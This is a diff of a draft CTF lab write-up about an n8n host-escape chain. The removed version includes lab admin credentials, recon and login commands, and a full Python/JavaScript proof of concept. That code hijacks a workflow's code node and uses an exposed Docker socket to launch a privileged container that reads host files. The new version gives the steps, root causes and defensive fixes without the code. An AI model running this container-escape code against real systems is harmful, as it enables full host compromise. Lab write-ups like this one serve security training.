@@ -4,232 +4,174 @@ draft: true
 
 # بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
 
-> Metadata intentionally omitted (you said you'll add it later).
+# AutoFlow / n8n Lab (Burp-First Writeup)
 
-# AutoFlow / n8n Lab — Full Baby-Step Writeup (English)
+> Metadata intentionally omitted (you’ll add it later).
 
-## Goal
-Read the host proof flag by exploiting weaknesses in the exposed n8n platform.
+## Who this is for
+- CTF players who want a clear, reproducible exploitation flow
+- Readers who prefer Burp-driven evidence over raw packet dumps
 
-Final result:
-
-```text
-flag_04f08006_5c38_428c_b137_734c23b84a40
-```
+## Final Result
+`flag_04f08006_5c38_428c_b137_734c23b84a40`
 
 ---
 
-## 0) Context and Why This Path
-The target exposed an n8n instance. n8n is very powerful: if you can control workflows/nodes, you can often execute logic that reaches internal resources.
-
-So the plan was:
-1. Find unauthenticated exposures
-2. Get valid n8n admin access
-3. Abuse workflow execution
-4. Pivot from container context to host context
-5. Read `/root/proof.txt`
+## Attack Chain at a Glance
+1. Recon finds exposed n8n service (`:5678`)
+2. Public debug endpoint leaks bootstrap credentials
+3. Admin login succeeds
+4. Existing active workflow is modified (code node abuse)
+5. Docker socket is reachable from workflow runtime
+6. Privileged helper container reads host `/root/proof.txt`
 
 ---
 
-## 1) Recon
+## Step 1 — Recon
+### What
+Identify exposed management/services.
 
-### Command
-```bash
-nmap -sC -sV -Pn -p- 10.8.0.2
-```
+### Action
+- Run service discovery (`nmap`) and open n8n web/API surface.
 
-### Important finding
-Open ports included:
-- 22 (SSH)
-- 443 (nginx)
-- 5678 (n8n)
+### Why it matters
+`5678` being exposed gives direct n8n attack surface.
 
-Why this matters:
-- 5678 is the direct n8n app surface.
-- If management/API is exposed there, we can test auth/debug weaknesses.
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/recon-ports.png`
 
 ---
 
-## 2) Initial Foothold — Debug Webhook Leak
+## Step 2 — Burp: Debug Credential Leak
+### What
+Intercept unauthenticated debug endpoint response.
 
-### Command
-```bash
-curl -s http://10.8.0.2:5678/webhook/health
-```
+### Action (Burp)
+- Send `GET /webhook/health` to Repeater.
+- Inspect JSON response.
 
-### Finding
-This endpoint leaked sensitive bootstrap values, including credentials:
-- `admin@cyberlab.local`
-- `CyberL4b_N8N_2026!`
+### Evidence expected
+Leaked admin bootstrap values (email/password).
 
-Why this matters:
-- This is the critical misconfiguration: unauthenticated debug data exposure.
-- It gives us legitimate owner login instead of brute force.
+### Why it matters
+This is the initial foothold: **sensitive debug data exposed without auth**.
 
----
-
-## 3) Authenticate to n8n API
-
-### Command
-```bash
-curl -s -X POST http://10.8.0.2:5678/rest/login \
-  -H "Content-Type: application/json" \
-  --data '{"emailOrLdapLoginId":"admin@cyberlab.local","password":"CyberL4b_N8N_2026!"}'
-```
-
-Why this matters:
-- Owner session allows workflow enumeration/modification.
-- n8n workflow control = high-impact primitive.
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/burp-webhook-health-leak.png`
 
 ---
 
-## 4) Workflow Abuse (Code Node)
+## Step 3 — Burp: Admin Authentication
+### What
+Use leaked credentials to establish admin session.
 
-We used an existing active workflow (`[AI Ops] Platform Health Check`, id `F0FNURY2irgjJcbp`), replaced logic with custom JS, and switched webhook response mode to return last-node JSON.
+### Action (Burp)
+- Replay login request in Repeater.
+- Confirm successful response + session cookie/token.
 
-Why this matters:
-- Avoids creating noisy new objects.
-- Uses native workflow behavior to run attacker-controlled logic.
+### Why it matters
+Admin session gives workflow management capability.
 
----
-
-## 5) Container-to-Host Pivot via Docker Socket
-
-Inside workflow code execution, we found `/run/docker.sock` mounted.
-
-Why this is huge:
-- Docker socket = Docker API control.
-- Docker API control often means host compromise if privileged containers can be created.
-
-We then created a helper container with:
-- `Privileged: true`
-- host bind mount `/:/host`
-- root user inside helper container
-
-Then read:
-- `/host/root/proof.txt`
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/burp-login-success.png`
 
 ---
 
-## 6) Exact Reproducible PoC
+## Step 4 — Target Existing Active Workflow
+### What
+Select a workflow already active to reduce noise and speed exploitation.
 
-```bash
-python3 - <<'PY'
-import requests
+### Target used
+`[AI Ops] Platform Health Check` (`F0FNURY2irgjJcbp`)
 
-base='http://10.8.0.2:5678'
-email='admin@cyberlab.local'
-password='CyberL4b_N8N_2026!'
-wid='F0FNURY2irgjJcbp'  # [AI Ops] Platform Health Check
+### Why it matters
+Using an existing active workflow is stealthier and faster than building from scratch.
 
-js = r"""const http=require('http');
-function req(method,path,body=null,raw=false){
-  return new Promise((res,rej)=>{
-    const r=http.request(
-      {socketPath:'/run/docker.sock',path,method,headers:{'Content-Type':'application/json'}},
-      (rp)=>{
-        const c=[]; rp.on('data',d=>c.push(d));
-        rp.on('end',()=>{const b=Buffer.concat(c); res({status:rp.statusCode,body:raw?b:b.toString('utf8')});});
-      }
-    );
-    r.on('error',rej); if(body) r.write(JSON.stringify(body)); r.end();
-  });
-}
-function demux(buf){
-  let o=''; let i=0;
-  while(i+8<=buf.length){ const l=buf.readUInt32BE(i+4); o+=buf.slice(i+8,i+8+l).toString('utf8'); i+=8+l; }
-  return o||buf.toString('utf8');
-}
-async function main(){
-  const cmd="id; whoami; echo HOST=$(cat /host/etc/hostname 2>/dev/null); " +
-    "echo '--- root dir'; ls -la /host/root 2>&1; " +
-    "echo '--- read proof'; cat /host/root/proof.txt 2>&1;";
-
-  const create={
-    Image:'postgres:16-alpine',
-    User:'0:0',
-    Entrypoint:['/bin/sh','-c'],
-    Cmd:cmd,
-    HostConfig:{
-      Binds:['/:/host:rw'],
-      Privileged:true,
-      PidMode:'host',
-      NetworkMode:'host',
-      UsernsMode:'host'
-    }
-  };
-
-  const c=await req('POST','/containers/create',create);
-  let cid=null; try{cid=JSON.parse(c.body).Id}catch(e){}
-  if(!cid) return [{json:{create_status:c.status,create_body:c.body}}];
-
-  const st=await req('POST',`/containers/${cid}/start`);
-  const wt=await req('POST',`/containers/${cid}/wait`);
-  const lg=await req('GET',`/containers/${cid}/logs?stdout=1&stderr=1`,null,true);
-  await req('DELETE',`/containers/${cid}?force=1`);
-
-  return [{json:{create_status:c.status,start_status:st.status,wait:wt.body,logs:demux(lg.body)}}];
-}
-return await main();"""
-
-s=requests.Session()
-
-r=s.post(base+'/rest/login',json={'emailOrLdapLoginId':email,'password':password},timeout=15)
-print('[login]', r.status_code)
-
-wf=s.get(base+f'/rest/workflows/{wid}',timeout=20).json()['data']
-
-for n in wf['nodes']:
-    if n.get('name')=='Health Check Endpoint':
-        p=n.get('parameters',{})
-        p['responseMode']='lastNode'
-        p['responseData']='firstEntryJson'
-        n['parameters']=p
-    if n.get('name')=='Check Services':
-        n['type']='n8n-nodes-base.code'
-        n['typeVersion']=2
-        n['parameters']={'mode':'runOnceForAllItems','jsCode':js}
-
-wf['connections']['Check Services']={'main':[[]]}
-
-payload={k:wf.get(k) for k in ['name','nodes','connections','settings','staticData','pinData']}
-u=s.patch(base+f'/rest/workflows/{wid}',json=payload,timeout=30)
-print('[patch]', u.status_code)
-
-vid=u.json()['data']['versionId']
-a=s.post(base+f'/rest/workflows/{wid}/activate',json={'versionId':vid},timeout=30)
-print('[activate]', a.status_code)
-
-t=s.get(base+'/webhook/health',timeout=180)
-print('[trigger]', t.status_code)
-print(t.text)
-PY
-```
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/workflow-list-target.png`
 
 ---
 
-## 7) Why It Worked (Root Cause)
+## Step 5 — Code Node Abuse
+### What
+Modify workflow code node to run attacker-controlled logic.
 
-Primary weaknesses:
-1. Unauthenticated debug endpoint leaked credentials
-2. n8n owner account could modify workflows directly
-3. Docker socket was exposed to the app execution context
-4. Privileged helper container creation was allowed
+### Action
+- Update code node logic.
+- Return output through last node response mode.
 
-This is a full chain from **info leak -> auth compromise -> workflow RCE primitive -> host compromise**.
+### Evidence expected
+- Runtime file read capabilities
+- Presence of `/run/docker.sock`
+
+### Why it matters
+Docker socket access from app runtime is a major privilege boundary break.
+
+### Screenshot placeholders
+- ` /mdx_images/2026/03/n8n/code-node-modified.png`
+- ` /mdx_images/2026/03/n8n/docker-socket-evidence.png`
 
 ---
 
-## 8) What to Fix (Defense)
-1. Remove/lock debug endpoints (`/webhook/health` etc.)
-2. Put n8n management/API behind strict auth/network ACL
+## Step 6 — Host Pivot Through Docker API
+### What
+Use Docker API from inside n8n runtime to create privileged helper container.
+
+### Action
+- Create helper container with `Privileged: true`
+- Mount host root as `/:/host`
+- Read `/host/root/proof.txt`
+
+### Why it works
+Container runtime is trusted with host-level control due to exposed Docker socket.
+
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/helper-container-pivot.png`
+
+---
+
+## Step 7 — Proof Extraction
+### What
+Read host proof file.
+
+### Evidence expected
+`/root/proof.txt` content visible in output.
+
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/proof-flag-output.png`
+
+### Flag
+`flag_04f08006_5c38_428c_b137_734c23b84a40`
+
+---
+
+## Root Cause Summary
+- Public debug endpoint leaked credentials
+- Privileged workflow modifications allowed after login
+- Docker socket exposed to application runtime
+- Privileged container creation not restricted
+
+**Net impact:** info leak → account compromise → workflow abuse → host compromise.
+
+---
+
+## Defensive Recommendations
+1. Disable or strictly protect debug/health endpoints
+2. Restrict n8n admin/API network exposure
 3. Never mount Docker socket into app containers
-4. Enforce least privilege and deny privileged container creation
-5. Separate app runtime from host-sensitive control planes
+4. Block privileged container creation in production
+5. Enforce least privilege and runtime isolation
 
 ---
 
-## 9) Flag
-```text
-flag_04f08006_5c38_428c_b137_734c23b84a40
-```
+## Publish Checklist (when you finalize)
+- [ ] Replace screenshot placeholders with your real Burp screenshots
+- [ ] Add frontmatter metadata (title/date/tags/cover)
+- [ ] Add Burp request IDs only if needed (avoid secrets)
+- [ ] Keep credential values redacted in public version
+
+---
+
+## Technical Source Notes
+Deep PoC reference file:
+`/home/pi/.openclaw/workspace/CTFDGSSI/N8N_Host_Escape_POC.md`
